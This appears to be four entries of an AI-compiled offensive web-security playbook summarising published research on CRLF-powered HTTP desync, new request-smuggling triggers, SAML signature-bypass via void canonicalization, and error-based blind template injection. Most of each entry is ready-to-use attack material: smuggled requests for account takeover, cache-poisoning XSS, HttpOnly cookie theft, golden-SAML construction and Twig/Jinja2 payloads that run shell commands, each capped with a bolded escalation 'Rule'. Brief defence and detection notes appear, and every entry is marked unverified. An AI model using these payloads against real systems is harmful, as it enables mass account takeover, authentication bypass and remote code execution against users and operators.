§17.235 — A CRLF/HEADER-INJECTION FLAG IS A DESYNC WAITING TO HAPPEN: THE TRIGGER IS USUALLY NGINX DECODING `%0d%0a` FROM A PATH WHEN `$uri` IS USED IN `proxy_pass` (OR `return 302 …$uri`), AND THE ESCALATION IS TWO CRLFs → REQUEST SPLITTING → RESPONSE QUEUE POISONING, A BROWSER-POWERED DESYNC WORM, `HttpOnly` SESSION-THEFT AND A TUNNELLING ACL BYPASS (PortSwigger, "CRLF-Powered Desync Attacks: Beheading HTTP Streams", Tom Stacey @t0xodile with Tobia Righi / TurtleSec, published 5 August 2026, co-presented at BHUSA and DEF CON; read in full this pass — `web_extract` elided the body, recovered with `curl` + desktop UA + local strip, 47,492 chars). THE TRIGGER AND DETECTION: `location / { proxy_pass http://backend$uri; }` makes Nginx normalise and url-decode the path, so `GET /%20HTTP/1.1%0d%0aContent-Length:%20X%0d%0aX:%20x HTTP/1.1` reaches the upstream as `GET / HTTP/1.1 / Content-Length: X / X: x HTTP/1.1` → `400`; work in Hackvertor with `<@urlencode_all>…</@urlencode_all>`. Detect by injecting invalid constructs with distinctive status codes: `HTTP/13.37` → `505`, `Transfer-Encoding: x` → `501`, `Expect: asdf` → `417`. CLASSIFY WHERE YOUR BYTES LAND: `GET /%0d%0aHost:%20x` returning `400` with an upstream shape `Host: tele.com` / `X-Original-Url: /` / `Host: x` proves the injection sits inside a custom upstream header AFTER the upstream Host (exit the first request immediately, then `GET / HTTP/1.1` + `Connection: keep-alive` — 500 connections for ~20 minutes harvested internal `{"token":"eyJ…"}` access tokens for $20,000 at a telecoms provider); an in-PATH landing makes RQP trivial; and the only NON-PATH case (injection inside a session COOKIE — `Cookie: sess=abc` — landing back in the upstream path) yielded credit-card numbers and PII from multiple corporations because the desync happened inside a payment provider's Kubernetes cluster (`Access-Control-Allow-Origin` per response identified the tenant). SPLIT WITH TWO CRLFs — no mutated header is needed, two CRLFs are simply a request boundary: a `TRACE`/`GET` smuggled after them produces repeated `200 OK` and then the smuggled verb's status; RQP at the edge of a CDN returned unrelated applications' responses and, with a `Host`-header redirect into a persistent-storage gadget (an account NICKNAME field) plus a classic prefix attack, captured other users' requests, session cookies and auth tokens for thousands of applications. WEAPONISE WHAT YOU SMUGGLE: `Content-Length: 69` + `0` + `POST /user/update?email=t0x@atk.cc Cookie: SESSID=abcdefg` steals the accounts of every live user of every subdomain via the victim's own session ($2,200); the first, less careful attempt reflected the attacker's `Set-Cookie` and logged every desynced user into the attacker's account (their carts overwrote his basket). WHEN TWO CRLFs ARE REJECTED, inject `Transfer-Encoding: chunked` against a real `Content-Length` for a CRLF-powered CL.TE and confirm it with the TIMEOUT technique (body `d` / `x=y` / `0` with `Content-Length: 13` → `-TIMEOUT-`). THE HEAD-TECHNIQUE CACHE POISON needs a size-matched gadget: the default `414 URI Too Long` response worked (`Content-Length: <correct>` + `0` + `HEAD /?<a*1000>` + `GET /` with `X-Reflect: <img/src/onerror=fetch()>` → `414` of `text/html` `Content-Length: 64`, then the reflected `204`) and XSS was served to random live users from cache. NESTED/STACKED RESPONSES: an extra response appended to other users' responses had `Content-Type: application/octet-stream`, so inline `alert(1)` never fired but a BLIND XSS payload (`<img/src/onerror=fetch()>`) pinged from phones worldwide — stack responses and use blind payloads when the type is unknown (a QR-code gadget then gave ATO; $500 after a duplicate fight). BROWSER-POWERED DESYNC: most of these are fetch-spec compatible, so the victim's browser can mount and re-spread them (`fetch("https://host/%20HTTP/1.1%0d%0a…")`, or POST with `body:"0\r\n\r\nTRACE / HTTP/1.1\r\nX: x"`) — with any XSS gadget that is a self-replicating DESYNC WORM, and it removes the cross-network requirement. BLIND TUNNELLING IS REVEALED BY INJECTING `Expect: 100-continue` — an unexpected `100 Continue` makes Nginx read the next response to completion even with no `Content-Length`, so the smuggled response comes back (`100 Continue` / `200 OK` / `405`), and tunnelling past front-end ACL rules read an internal `GET /config` (`Disallow: /` from robots.txt followed by `application/json` config) at a car manufacturer. CONNECTION-LOCKED `0.CL` (injected `Content-Length`) over your own keep-alive connections plus the HEAD technique (`HEAD /50x.html Host: localhost` + `GET /status<svg/onload=alert(1)>`) produced a `307` with the payload in `Location`; get it into a browser with `window.open(stage1)` then `w.close(); location=stage2` after 500 ms because browsers reuse a connection only in specific pairings (stole PII, $5,000). IP-LOCKED desyncs (HTTP/2 + injected `Expect`) are made universal by the `Range` HEAD gadget, which rewrites `Content-Length` so any long response over-reads an arbitrary-length payload: prefix `Range: bytes=1-2`, `HEAD /docs/ … Range: bytes=1-650`, `POST /docs/ … Content-Length: 20` with `<script/src=\\atk.cc>` → `206 Partial Content` plus a `400` JSON error reflecting the tag; the missing `</script>` came from STACKING another request with `Range: bytes=2828-2836`; driving it from a browser needed rapid create/remove iframes behind a fake "Loading your profile" page (~10 s) and then a CORS misconfiguration to read tokens ($3,255). STEALING `HttpOnly` COOKIES: if the session cookie is RENEWED on some responses, stack a request whose response carries `Set-Cookie` AFTER your XSS payload so the header is pushed into the response BODY (`HEAD /abc` + `GET /static?<xss-payload>` + `GET /api/account … Cookie: Session=victim` → `301 Location: /?<payload>` then `200 application/json Set-Cookie: Session=victim; HttpOnly` in the body) and let the on-page XSS exfiltrate it; in the browser use a real user CLICK plus a self-refreshing `window.open` (Chrome allows one per gesture) rather than iframes. RESPONSE-SIDE HEADER INJECTION (Nginx `return 302 https://example.com$uri`) gives COOKIE TOSSING (inject `Set-Cookie: Sess=abc` on a TikTok domain → the victim's sensitive actions run in the attacker's session, stealing their private uploads; $4,500) and XSS ON A REDIRECT via an origin header that instructs the edge — `CDN-Cache-Control: private="Location"` makes Cloudflare strip `Location` so the injected body renders — with the WAF bypassed for the payload by injecting `Content-Type: text/html;charset=ISO-2022-JP` and writing the tag in ISO-2022-JP escapes (`<scr(Bipt>alert(B(1(B)</scr(Bipt>`). REVERSE DESYNC (Amit Klein 2004) is killed by stacked-response handling. Defence: never put `$uri`/`$document_uri` in `proxy_pass`/`return` (also check OpenResty/Tengine), and prefer HTTP/2 upstream. DETECTION SIGNAL: `%0d%0a` surviving into the upstream request; a status that flips on injected invalid syntax (505/501/417); a 400 when you add a second `Host:`; identical requests on ONE keep-alive connection that desync; a state-changing endpoint whose response you can steer into other users' streams; a cache serving one body per URL. TRANSFERABLE TEST: classify the insertion point, prove the split with a distinctive status code, smuggle the request that CHANGES A VICTIM'S ACCOUNT, try to push a `Set-Cookie` response into their body, poison a cache with a size-matched gadget (414 is 64 bytes of `text/html`), reveal a blind tunnel with `Expect: 100-continue`, and move it into the victim's browser with `fetch()` or `window.open`+`location`. WHY IT IS A NEW GENERAL METHOD: `desync worm`, `Expect: 100-continue`, `0.CL`, `HEAD technique`, `ISO-2022-JP`, `CDN-Cache-Control` = 0 hits as techniques; `cookie tossing` (playbook 1 hit) is only a double-submit-cookie forgery mechanism; the header-injection→smuggling CLASS and the batch-69 "Making HTTP header injection critical with one prompt" entry (the Host-probe / bogus-version-prefix / open-redirect-gadget / cache-poisoning methodology, which explicitly avoided RQP) are pre-recorded and NOT re-recorded — this slot holds what that entry lacked (the Nginx `$uri` trigger, the 505/501/417 detection codes, the two-CRLF split, live RQP incl. the CDN-internal and cookie-insertion-point cases, the browser-powered worm, the `Expect` tunnel reveal and its ACL bypass, 0.CL/IP-locked desyncs, the `Range` HEAD gadget, `HttpOnly` theft by a stacked `Set-Cookie`, and the response-header-injection exploits). Rule: **spend a CRLF/header injection on a desync — find the insertion point that reaches the upstream request (path behind Nginx `$uri`, cookie, or rewritten custom header), prove the split with a distinctive status code, then escalate by smuggling the request that rewrites a victim's account or by pushing their `Set-Cookie` into your response; that is where mass account takeover, `HttpOnly` theft, cache-owned XSS and the browser-powered desync worm live.** Slot 17.235. UNVERIFIED (not reproduced) — no Nginx/edge lab was stood up and no target was touched this pass.

§17.236 — THE DESYNC FRONTIER IS NOT `Content-Length` VS `Transfer-Encoding`: MEASURE THE FRONT-END WITH A LENGTH RULER, MUTATE THE FRAMING NOBODY VALIDATES (`Transfer-Encoding: gzip`, `multipart/byteranges` AS A REQUEST, DUPLICATED IDENTICAL `Content-Length`), AND SMUGGLE A REQUEST MISSING ONE BYTE SO THE VICTIM'S OWN REQUEST SUPPLIES IT AND THE RESPONSES STOP RACING (PortSwigger, "Can AI do novel security research? Meet the HTTP Terminator", James Kettle @albinowax, published 5 August 2026, updated 6 October 2026; read in full this pass — `web_extract` elided the body, recovered with `curl` + desktop UA + local strip, 52,554 chars; the paper's AI-process/harness-design narrative is deliberately excluded). THE PROTOCOL RULER (an undisclosed black-box recon technique published here): almost every server has a header-length limit and a front-end TRANSFORMATION changes byte length, so binary-search the limit (`A: AAA…{64040}` → `200`, 64,041 → `400`) and then replace two bytes with the candidate sequence (`c0 8a`) and re-find it: the limit moving to 64,030 proves a 10-byte EXPANSION (mojibake/Unicode transformation). This exposes value-rewriting of IP-spoofing headers, header dropping/overriding and Unicode transformations that create desyncs (Param Miner now implements it). THE EVALUATION PRIMITIVE: take a control request that is always stable (`GET /` → `200`) and re-send it after a candidate trigger was sent over a SEPARATE connection — a changed control response (`405`) proves cross-request contamination with NO expectation of what the poisoned response looks like (which is why unknown desync classes are detectable); classify with a bogus-version smuggled request (`GET / HTTP/777` + `X: Y` → victim gets `505`). CONFIRMED NOVEL TRIGGERS: `GET / HTTP/1.0` + `Transfer-Encoding: gzip` (a CL.0 desync on many servers — a US government site, and via a collaborator scan an AIRPORT whose staff admin panels with flights/passengers/luggage leaked; underlying flaw traced to F5 Big-IP); `Content-Type: multipart/byteranges; boundary=BOUND` used as a plain CL.0 trigger with the payload placed directly after `Content-Length` (NOT after the multipart terminator) — worked on multiple server implementations and exposed 200+ sites including an American bank, the insight being RFC 2616 §19.2's rule about `multipart/byteranges` in a `206` RESPONSE being misapplied by a parser shared between requests and responses; plus `Upgrade: websocket`, `CONNECT / HTTP/1.1`, `OPTIONS / HTTP/1.0` with `Expect :\t100-continue`, `POST / HTTP/2` (no content-length), the single-packet attack, `Content-Type: multipart/form-data; boundary=x`, `Transfer_Encoding: chunked` (UNDERSCORE — ignored as framing, maybe not by the back-end), `Range: ,`, `OPTIONS *?xyz HTTP/1.1` (also an early-response gadget), an over-long header, `Get /` (mixed case), duplicated `Content-Length: 1`, `POST /HTTP/1.1` + `x x`, `GET / /`, `Early-data: 1`, `DELETE / HTTP/1.1` + `Max-Forwards: 0`. NOVEL PATTERN — DUAL MATCHING `Content-Length`: two identical, valid `Content-Length: 28` headers make the server treat the body as ZERO bytes (CL.0 semantics) with no framing disagreement at all (`GET / HTTP/1.1 Host: sso.redacted.com Content-Length: 28 Content-Length: 28` + body `GET /x HTTP/5.1 X: X` → the victim gets `505`), which exploited an SSO server; a sibling vector leaked a bank's long-lived API key out of public infrastructure (Citrix NetScaler misconfiguration). THE DANGLING-BYTE TECHNIQUE (novel RQP weaponisation): smuggle a request MISSING ONE BYTE (`POST /smuggled HTTP/1.1 Host: example.com Content-Length: 1` with no body byte) so the back-end cannot produce its second response until the VICTIM's request completes it — the race is gone, the results are deterministic (`403` on your trigger, `404` on the victim's request, and the response carrying `Victim-data…` arrives in YOUR stream), and it worked on every target with a method-agnostic back-end; it exists to defeat the STACKED-RESPONSE problem (a front-end that over-reads a second response and resets), whose previous only countermeasure was raw request volume. STATUS-LINE INJECTION (new): servers that copy the request line's protocol string into the response status line (`GET / COW<` → `COW< 200 OK`) let you reach front-end response-processing code, and on a bank host `OPTIONS / COW<S>` caused a complete BUFFERING BREAKDOWN. RANGE CACHE POISONING (new): range responses sent as `200` instead of `206` are cacheable, so `Range: bytes=5-10, 1-2` returns slices an intermediate cache can serve, `Range: bytes=364-382, 1-2` lets a front-end REASSEMBLE attacker-chosen slices into valid HTML, and `GET /x?q=sanitized\x<` with `Range: bytes=5-10` returns the reflected string WITH the `<` because escaping was applied to the whole document while only a slice was served. RESPONSE FORKING (new class): `GET / HTTP/1.1` with `Content-Length: X` + `Accept-Encoding: identity` + `Content-Type: multipart/byteranges` returned `400` plus a SECOND complete response delivered over HTTP/0.9 with no headers (compressed as a binary blob when `gzip, deflate, br` was advertised) — one request, two responses, no length disagreement, no body needed; RQP was not proven on that target. SHARED-PARSER CONFUSION (the headline concept): servers reuse the same parser for requests and responses, so RESPONSE-side rules and features are reachable from a REQUEST ("any response-processing feature could be exploited by a request", which also explains servers honouring `Set-Cookie` in requests); closest prior work is Orange Tsai's Apache "Confusion Attacks" `Location` SSRF chain, partial overlap only. Also harvested: an anomaly-detector (text/binary blend, double `<HTML`, inline HTTP headers) found a zero-day in Apache Traffic Server from a badly behaved generator's `DELETE /foo … Content-Location: http://attacker.com/ Max-Forwards: 0 Content-Length: 12` + `TRACE /?x=yz` combination (CVE-2026-63078, patched). DEFENCE: never use upstream HTTP/1.1; if you must, allow-list request methods on both tiers and permit a body only for POST/PUT/PATCH — never GET/HEAD/OPTIONS. DETECTION SIGNAL: a control request that changes when another connection is opened with a malformed HTTP/1.0/TE/CONNECT/Upgrade/`Expect` construct; duplicated or underscore-mutated framing headers; a range response served as `200`; a status line echoing your protocol string; a front-end that resets on stacked responses (the obstacle the dangling byte defeats). TRANSFERABLE TEST: fingerprint with the protocol ruler; evaluate every candidate trigger against a stable control request on a separate connection; walk the confirmed-trigger list; kill the race with the dangling byte; probe range responses for `200`; test `GET / COW<`; and ask of every discovered response-processing feature whether a REQUEST can trigger it. WHY IT IS A NEW GENERAL METHOD: `protocol ruler`, `shared-parser`/`Shared Parser`, `response forking`, `multipart/byteranges`, `Transfer-Encoding: gzip`, `Early-data`, `Range: ,`, `dangling byte`, `HTTP Terminator` = 0 hits across all three write targets; the desync/smuggling class, `CL.TE`/`CL.0` framing, the `Expect` weaponisation (recorded in §17.235) and bogus-version detection (batch 69) are pre-recorded and NOT re-recorded. Rule: **the desync frontier moved from `Content-Length` vs `Transfer-Encoding` to the framing constructs nobody validates — measure the front-end's transformations with a length ruler, try `Transfer-Encoding: gzip`, `multipart/byteranges` in a REQUEST and duplicated identical `Content-Length` headers, and smuggle a request missing one byte so the victim's own request supplies it: the responses then stop racing and their data lands in your stream.** Slot 17.236. UNVERIFIED (not reproduced) — no harness, target or Turbo Intruder session was used this pass.

§17.237 — THE SIGNATURE IS A SEPARATE PROGRAM FROM THE ASSERTION PARSER: OBTAIN ANY XML THE IDP HAS SIGNED, GRAFT ITS ENVELOPED SIGNATURE INTO A SCHEMA-VALID EXTENSION POINT WHILE THE APP CONSUMES YOUR ASSERTION, SPLIT THE PARSERS WITH DUPLICATE UNPREFIXED/PREFIXED ATTRIBUTES AND RESERVED-`xml` NAMESPACE CONFUSION, AND FINISH WITH VOID CANONICALIZATION — A RELATIVE NAMESPACE URI MAKES CANONICALIZATION ERROR OUT AND BE TREATED AS AN EMPTY STRING, SO THE DIGEST BECOMES THE KNOWN SHA-256 OF EMPTY AND A PRECOMPUTED EMPTY-STRING SIGNATURE VALIDATES AN ARBITRARY ASSERTION (PortSwigger, "The Fragile Lock: Novel Bypasses For SAML Authentication", Zakhar Fedotkin @zakfedotkin, published 10 December 2025, updated 21 January 2026; ruby-saml 1.12.4 / CVE-2025-66567 + CVE-2025-66568, php-saml, xmlseclibs < 3.1.4; timeline 2025-04-29 → 2026-01-20 (Okta replied that changing signing behaviour would violate the SAML/WS-Fed standards); read in full this pass via `web_extract` plus the fuller XML blocks from `curl` + strip). THE PRECONDITION IS DELETED: classic XSW needs a legitimately signed SAML Assertion (register at the IdP, MITM, Google dorking) and most SPs accept one only once — instead reuse ANY XML document signed with the IdP's private key. Free sources of a valid signature: SAML metadata (often retrievable signed by appending `?sign=true`), the IdP's SIGNED ERROR RESPONSE (a `samlp:AuthnRequest` needs only `ID`, `Version`, `IssueInstant`, so `ID="&#x80;"`, `IssueInstant="INVALID"`, `Version="INVALID"` still yields a signed failure response), and WS-Federation metadata, which is nearly always public for major IdPs. WHY IT IS FRAGILE: ruby-saml verifies with TWO parsers — REXML extracts `DigestValue`/`SignatureValue`, Nokogiri (libxml2) canonicalises the referenced element — and both locate the signature with the permissive XPath `//ds:Signature` (first occurrence anywhere) before REXML only checks that its parent is an Assertion; the 1.12.4 patch added DTD and well-formedness checks and left this intact. ATTRIBUTE POLLUTION: libxml2's `xmlGetProp` explicitly IGNORES namespaces, so with simple-name collisions (`<samlp:Response ID="1" samlp:ID="2">` vs `<samlp:Response samlp:ID="2" ID="1">`) the value depends ONLY on attribute ORDER, and REXML (independent implementation) resolves the opposite one for the same document (`attributes['ID']`, `get_attribute("ID").value`); PHP's `DOMNamedNodeMap::getNamedItem` is also simple-name only. So `//*[@ID='id']` (namespace-ignoring) and the business logic's `element['ID']` / `getNamedItem('ID')` / `attributes['ID']` can resolve to DIFFERENT elements — e.g. `<samlp:Response ID="attack" samlp:ID="ID"><Signature><Reference URI="#ID"/></Signature><samlp:Extensions><Assertion ID="#ID"/></samlp:Extensions><Assertion ID="evil"/></samlp:Response>`. REXML NAMESPACE CONFUSION WITHOUT DTDS: `xmlns` and the reserved `xml` prefix are ordinary attributes to REXML, so `<Signature xml:xmlns='http://www.w3.org/2000/09/xmldsig#'/>`, or `<Parent xmlns='http://www.w3.org/2000/09/xmldsig#'><Child xml:xmlns='#anything'><Signature/></Child></Parent>`, makes REXML's `//ds:Signature` miss a Signature node Nokogiri still sees (and vice-versa) — the DTD check that killed the earlier `saml-roulette` attack does not help. STAY SCHEMA-VALID: ruby-saml ships 12 XSDs but permits extension points; the two elements that precede the Signature in a valid response are `samlp:Extensions` and `samlp:StatusDetail`, so put the REAL enveloped signature inside `Extensions` in the namespace-confused wrapper and leave a FAKE `Signature` inside the `Assertion`. IMPOSSIBLE XSW → VOID CANONICALIZATION: the fake `Signature` inside the hashed element makes the digest self-referential (the parser strips the Signature before hashing, yours is inside it) — unbreakable by hashing tricks; solve it at the TRANSFORMATION stage instead. The XML Signature Recommendation warns that "the relative URIs will not be operational in the canonical form", and most implementations do not fail securely: `<samlp:Response xmlns:ns="1">` (a relative namespace URI) is still well-formed but errors during libxml2 canonicalization, and Nokogiri's canonicalization then RETURNS AN EMPTY STRING, so the `DigestValue` covers empty input — the SHA-256 of the empty string, `47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=`. Because `SignatureValue` signs the canonicalised `SignedInfo`, anyone who has ever obtained a signature over an empty string can reuse it, producing a GOLDEN SAML RESPONSE that validates regardless of the claims (sample in the project's GitHub `Samples` folder). ASSEMBLE (the paper's four steps): extracted enveloped signature in the extension point + reserved `xml`-attribute namespace declaration hiding the Signature from the SAML processing module while keeping it for verification + fake `Signature` in the Assertion holding the empty-string digest + void canonicalization raising the unhandled exception that bypasses the hash check. IMPACT: a fully bypassed GitLab EE 17.8.4 (public demo) and an undisclosed large SaaS where the forged response plus Gareth Heyes' "Splitting the Email Atom" parser trick created a new account and bypassed authentication. Tooling: https://github.com/d0ge/XSW (with additions coming to SAML Raider). NOT vulnerable: XMLSec (aleksey.com/xmlsec) and Shibboleth xmlsectool. DETECTION SIGNAL: signature verification and assertion processing in different modules/parsers (Ruby REXML + Nokogiri; PHP DOM + xmlseclibs); a permissive `//ds:Signature` / `//*[@ID=…]` lookup instead of resolving the referenced element; namespace-agnostic attribute getters; the same simple attribute name appearing both unprefixed and prefixed (or duplicate attributes where ORDER decides); acceptance of `samlp:Extensions`/`StatusDetail` before the signature; any signed XML the IdP hands you for free. TRANSFERABLE TEST: collect a valid signature legitimately, build the XSW document (real signature in `Extensions`/`StatusDetail`, fake `Signature` in the Assertion, duplicate `ID`/`prefixed:ID` in both orders, `xmlns:ns="1"` for the void canonicalization, empty-string SHA-256 digest), POST it to the ACS and see whether a session is issued for YOUR claim; compare `xmlsec1 --verify` (should fail) with the app's own validators, because the technique lives in the gap between them. WHY IT IS A NEW GENERAL METHOD: `Void Canonicalization`, `attribute pollution`, `REXML`, `SAMLRaider`, `66568` = 0 hits; the SAML/XSW CLASS is recorded (§17.1 Rocket.Chat XSW, §17.45/#136169 OneLogin signature stripping, §17.38 Grammarly `entityId`, the `saml-roulette` DTD material) and is NOT re-recorded; `Nokogiri` hits (6/1/5) are an unrelated NuGet traversal and an mXSS differential; `canonicaliz` hits (12/17/3) are delimiter-less signed-request canonicalization, Java path canonicalization and JWT material. Rule: **the signature verifier and the assertion parser are different programs — take any XML the IdP has signed and graft its enveloped signature into a schema-valid extension point while the app consumes YOUR assertion, split the parsers using duplicate unprefixed/prefixed attributes and reserved-`xml` namespace confusion, and finish with void canonicalization: a relative namespace URI makes canonicalization error out and be treated as empty, so the digest is the known SHA-256 of empty and a precomputed empty-string signature authenticates anyone.** Slot 17.237. UNVERIFIED (not reproduced) — no SAML SP/IdP pair or GitLab instance was stood up this pass.

§17.238 — A BLIND TEMPLATE OR CODE INJECTION IS AN OUTPUT PROBLEM, NOT AN EXECUTION PROBLEM: TRIGGER AN ERROR WHOSE MESSAGE ECHOES YOUR DATA (`getattr("", …)` AND FRIENDS) TO READ COMMAND OUTPUT OUT OF THE ERROR TEXT, AND WHEN ERRORS ARE SUPPRESSED CONDITIONALLY TRIGGER ONE (`1/(condition)`) AND DIFF A STABLE SET OF RESPONSE PARAMETERS BETWEEN TWO NEAR-IDENTICAL PAYLOADS — AND YOU NEVER NEED TO GUESS THE LANGUAGE, BECAUSE `(1/0).zxy.zxy` AND THE BROKEN-ARITHMETIC POLYGLOT DETECT IT (Vladislav Korchagin @vladko312, "Successful Errors: New Code Injection and SSTI Techniques", ranked #1 in PortSwigger's "Top 10 web hacking techniques of 2025", published 5 February 2026; primary read in full this pass — whitepaper README 48,696 bytes / 720 lines plus `Payloads.md` via `curl`; v2 of the paper, SSTImap 1.3.1; CVE-2025-13204 expr-eval, CVE-2025-1302 JSONPath Plus). ERROR-BASED (new technique): force an error whose message reflects your data, exactly like `CONVERT(INT, …)` in SQLi, so otherwise-blind code execution returns its output inside the error text; injection contexts usually allow only expression evaluation, so pick errors that reflect ARBITRARY user data rather than truncating conversions. PER-LANGUAGE REFLECTING ERRORS: PYTHON `getattr("", OUTPUT)` (no length limit — the naive int conversion truncates at 199 chars; Jinja2 `{{ cycler.__init__.__globals__.__builtins__.getattr("", OUTPUT) }}`, or `{% include OUTPUT %}` for a reflecting `TemplateNotFound`); PHP `OUTPUT()` in some engines, `fopen(OUTPUT,"r")`/`include(OUTPUT)` (Warnings that may render where you cannot see them) and `call_user_func(OUTPUT)` for a FATAL error that renders directly; Twig `{% set OUTPUT={"ls -la":"shell_exec"}|map("call_user_func")|join %}` with the error raised by `{{ [0]|map(OUTPUT) }}` (older Twig: `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}` + `{%set OUTPUT=_self.env.getFilter("ls -la")%}`); JAVA SpEL `"".getClass().forName('java.lang.Integer').valueOf(OUTPUT)` (SpEL-specific: `T(java.lang.Integer).valueOf(OUTPUT)`), OGNL `OUTPUT/0`, Freemarker `${ OUTPUT?new() }`, Velocity `#include(OUTPUT)`; RUBY `File.read(OUTPUT)`; NODEJS `require(OUTPUT)` or `""["x"][OUTPUT]`; ELIXIR `[1, 2][OUTPUT]`. GENERIC verbose-error detection: `(1/0).zxy.zxy` — the division-by-zero fires in most languages and the attribute access forces an error where `/0` yields `NaN` (Node), while `zxy` is a searchable keyword in the response. BOOLEAN ERROR-BASED BLIND (new technique): when verbose errors are off you can still detect WHETHER an error occurred, so error only when the condition is FALSE — no sleep, no timing noise: PYTHON `1 / ( OUTPUT )` (Jinja2 `{{ 1 / (not not cycler.__init__.__globals__.__builtins__.eval( … )) }}`); PHP `1 / ( … )` with pairs `'2'+'3'==5` / `'2'+'5'==3` and `strlen('2')==1` / `strlen('1')==2`, Twig `{{1/({"…&&echo SSTIMAP":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "SSTIMAP")}}` (a sentinel replaces the return code); JAVA SpEL/OGNL `1/(( … )?1:0)+""`, Freemarker `${1/((…)?string('1','0')?eval)}`, Velocity `#if(true)#include("Y:/A:/false")#end` pairs; RUBY `1/(!!( ... )&&1||0)`; NODEJS `[""][0 + !( … )]["length"]` (JS has no division-by-zero error); ELIXIR `1/(( … )&&1||0)`; OS-command success is read from the exit code or a sentinel (`&& echo SSTIMAP`). LANGUAGE-AGNOSTIC DETECTION WITHOUT GUESSING THE ENGINE (the "polyglot" half of the award): every language shares arithmetic syntax, so send SYNTACTICALLY BROKEN variants — `(3*4/2)` vs `3*)2(/4` and `((7*8)/(2*4))` vs `7)(*)8)(2/(*4` — and a response difference proves Code Injection/SSTI. ERROR-DETECTION HARNESS (transferable): compare ~13 response parameters between payload pairs — status code, response time, encoding, byte length, character length, word count, line count, header count, cookie count, redirect count, final URL, `Content-Type`, `Server` — call a parameter STABLE when it is constant or within 5% of the average over repeats; DISCARD the first request (a fresh IP changes app behaviour); use TWO pairs of near-identical payloads so one pair's noise cannot masquerade as the signal; and prefix outputs with a string that cannot exist (`Y:/A:/…`) so a valid result can never be mistaken for an error. Syntax errors are useless for exfiltration (they abort template parsing before evaluation). PROVEN: a Discord no-code bot constructor evaluated template expressions with `expr-eval` (CVE-2025-13204) and coerced the result to a number (returning `NaN`), so the ERROR path was used to exfiltrate `execSync('id')` output; CVE-2025-1302 (JSONPath Plus) output likewise became obtainable in every injection context. All payloads ship in SSTImap ≥1.3.0. DETECTION SIGNAL: any expression/template evaluation sink whose output is coerced or not rendered (custom template tags, report/graph expressions, "no-code" builders, eval-backed filters, search/filter DSLs); error pages that echo the offending value; error-vs-normal pages differing in status/length/headers (the boolean oracle); a string passing into `getattr`/`fopen`/`include`/`require`/`File.read`/class lookup. TRANSFERABLE TEST: send `(1/0).zxy.zxy` and grep for `zxy`; switch to the reflecting-error payload of the identified language and read command output out of the error; if errors are off, use `1/( … )` boolean pairs with `Y:/A:/…` prefixes and diff the stable parameter set across two pairs (first request discarded); if the language is unknown, try the syntax-error pairs. WHY IT IS A NEW GENERAL METHOD: `SSTImap`, `TemplateNotFound`, `(1/0)`, `zxy`, `Korchagin`, `Tplmap`, `expr-eval`, `JSONPath Plus`, `Y:/A:/` = 0 hits; the SSTI/code-injection CLASS and Kettle's 2015 rendered + time-based methods are pre-recorded and NOT re-recorded — the pre-existing `Error-Based` (7/9/2) and `Boolean-Based` (4/6/0) hits are SQLi/other contexts and `polyglot` (4/38/1) hits are unrelated mXSS/parser-differential and wordlist material. Rule: **a blind injection is an output problem — read command output out of a reflecting error message (`getattr("", …)`, `call_user_func(…)`, `File.read(…)`, `require(…)`, `?new()`), and when errors are suppressed flip to a conditional error (`1/(condition)`) and diff a stable set of response parameters between two near-identical payload pairs; detection needs no language guess, because `(1/0).zxy.zxy` and broken arithmetic polyglots find the class anywhere.** Slot 17.238. UNVERIFIED (not reproduced) — no template engine or SSTImap instance was stood up this pass.
